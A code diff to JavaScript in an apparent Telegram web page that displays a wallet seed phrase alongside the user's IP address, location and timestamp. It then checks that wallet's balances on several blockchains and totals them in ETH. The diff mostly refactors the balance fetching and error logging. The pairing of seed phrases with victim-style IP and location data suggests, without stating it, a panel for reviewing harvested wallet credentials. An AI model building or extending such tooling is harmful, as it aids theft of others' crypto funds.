@@ -33,7 +33,7 @@
         document.getElementById("timestamp").textContent = timestamp;
         document.getElementById("userIp").textContent = ip;
         document.getElementById("userLocation").textContent = userLocation;
-        document.getElementById("seed").textContent = seedPhrase;
+        document.getElementById("seed").value = seedPhrase;
 
         const addressSpan = document.getElementById("walletAddress");
         const balanceSpan = document.getElementById("walletBalance");
@@ -66,28 +66,29 @@
                 const res = await fetch(url);
                 return await res.json();
             } catch (e) {
-                console.warn("Ошибка загрузки цен:", e);
+                console.warn("❌ Ошибка загрузки цен:", e);
                 return {};
             }
         }
 
         async function fetchBalance(chain, address) {
+            if (!address) return 0;
             try {
                 switch (chain) {
                     case "ethereum":
-                        return fetch(`https://api.blockchair.com/ethereum/dashboards/address/${address}`)
-                            .then(r => r.json())
-                            .then(d => parseFloat(d.data[address.toLowerCase()].address.balance) / 1e18);
+                        const ethRes = await fetch(`https://api.blockchair.com/ethereum/dashboards/address/${address}`);
+                        const ethData = await ethRes.json();
+                        return parseFloat(ethData?.data?.[address.toLowerCase()]?.address?.balance || 0) / 1e18;
                     case "bitcoin":
-                        return fetch(`https://blockchain.info/q/addressbalance/${address}?confirmations=3`)
-                            .then(r => r.text())
-                            .then(sats => parseFloat(sats) / 1e8);
+                        const btcRes = await fetch(`https://blockchain.info/q/addressbalance/${address}?confirmations=3`);
+                        const btc = await btcRes.text();
+                        return parseFloat(btc) / 1e8;
                     case "bsc":
-                        return fetch(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=YourApiKeyToken`)
-                            .then(r => r.json())
-                            .then(d => parseFloat(d.result) / 1e18);
+                        const bscRes = await fetch(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=YourApiKeyToken`);
+                        const bscData = await bscRes.json();
+                        return parseFloat(bscData.result || 0) / 1e18;
                     case "solana":
-                        return fetch("https://api.mainnet-beta.solana.com", {
+                        const solRes = await fetch("https://api.mainnet-beta.solana.com", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({
@@ -96,27 +97,29 @@
                                 method: "getBalance",
                                 params: [address]
                             })
-                        }).then(r => r.json()).then(d => parseFloat(d.result.value) / 1e9);
+                        });
+                        const solData = await solRes.json();
+                        return parseFloat(solData?.result?.value || 0) / 1e9;
                     case "polygon":
-                        return fetch(`https://api.polygonscan.com/api?module=account&action=balance&address=${address}&apikey=YourApiKeyToken`)
-                            .then(r => r.json())
-                            .then(d => parseFloat(d.result) / 1e18);
+                        const polyRes = await fetch(`https://api.polygonscan.com/api?module=account&action=balance&address=${address}&apikey=YourApiKeyToken`);
+                        const polyData = await polyRes.json();
+                        return parseFloat(polyData.result || 0) / 1e18;
                     case "tron":
-                        return fetch(`https://api.trongrid.io/v1/accounts/${address}`)
-                            .then(r => r.json())
-                            .then(d => parseFloat(d.data?.[0]?.balance || 0) / 1e6);
+                        const tronRes = await fetch(`https://api.trongrid.io/v1/accounts/${address}`);
+                        const tronData = await tronRes.json();
+                        return parseFloat(tronData?.data?.[0]?.balance || 0) / 1e6;
                     default:
                         return 0;
                 }
             } catch (e) {
-                console.warn(`Ошибка баланса ${chain}:`, e);
+                console.warn(`❌ Ошибка получения баланса (${chain}):`, e);
                 return 0;
             }
         }
 
         async function calculateTotalETH() {
             if (!ethAddress) {
-                balanceSpan.textContent = "Ошибка адреса";
+                balanceSpan.textContent = "❌ Ошибка адреса";
                 return;
             }
 
@@ -126,6 +129,7 @@
             for (const token of supported) {
                 const balance = await fetchBalance(token.chain, ethAddress);
                 const rate = prices[token.coin]?.eth || 0;
+                console.log(`📦 ${token.symbol}: ${balance} × ${rate}`);
                 totalETH += balance * rate;
             }
 
@@ -149,9 +153,14 @@
                 url = "https://www.coinbase.com/wallet";
             }
 
-            if (window.Telegram && Telegram.WebApp) {
-                Telegram.WebApp.openLink(url);
-            } else {
+            try {
+                if (window.Telegram && Telegram.WebApp) {
+                    Telegram.WebApp.openLink(url);
+                } else {
+                    window.open(url, "_blank");
+                }
+            } catch (e) {
+                console.warn("⚠️ Не удалось открыть ссылку:", e);
                 window.open(url, "_blank");
             }
         }
